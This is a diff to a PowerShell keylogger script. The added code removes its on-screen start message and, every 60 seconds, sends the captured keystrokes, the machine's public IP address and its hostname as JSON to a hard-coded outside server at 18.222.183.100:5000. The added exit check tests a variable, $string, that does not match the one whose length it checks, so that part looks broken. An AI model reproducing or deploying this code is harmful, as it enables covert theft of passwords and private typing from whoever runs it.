@@ -16,10 +16,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
    # output file
    $no_output = New-Item -Path $logPath -ItemType File -Force
-
+  $pattern = "cybersecurity"
    try
    {
-     Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
 	$assoc = ""
      while ($true) {
        Start-Sleep -Milliseconds 40
@@ -45,8 +44,24 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
            }
          }
        }
-	if ($timer.elapsed.totalseconds -gt 5) {
-	Write-Host $assoc
+       if ($assoc.Length -ge 13 -and $string.Substring($string.Length -13) -eq $pattern) {
+        throw "exit the keylogger"
+      }
+	if ($timer.elapsed.totalseconds -gt 60) {
+$res = Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -uri "http://ifconfig.me/ip").Content)
+$ip = $res | Select-String -Pattern \d\d?\d?\.\d\d?\d?\.\d\d?\d?\.\d\d?\d? | foreach {$_.Matches.Value}
+$hostn = hostname
+$headers = @{
+  "Content-Type" = "application/json"
+}
+$uri = "http://18.222.183.100:5000/post"
+$body = @{
+    "data" = $assoc
+    "ip" = $ip
+    "name" = $hostn
+}
+$body = $body | ConvertTo-Json
+Invoke-RestMethod -Uri $uri -Method POST -Body $body -Headers $headers
 	$assoc = ""
 	$timer.stop()
 	$timer = [Diagnostics.Stopwatch]::StartNew()
@@ -55,7 +70,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
    }
    finally
    {
-     notepad $logPath
+    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+    [System.Windows.Forms.MessageBox]::Show("The keylogger has been exited.")
    }
  }
 Test-Keylogger
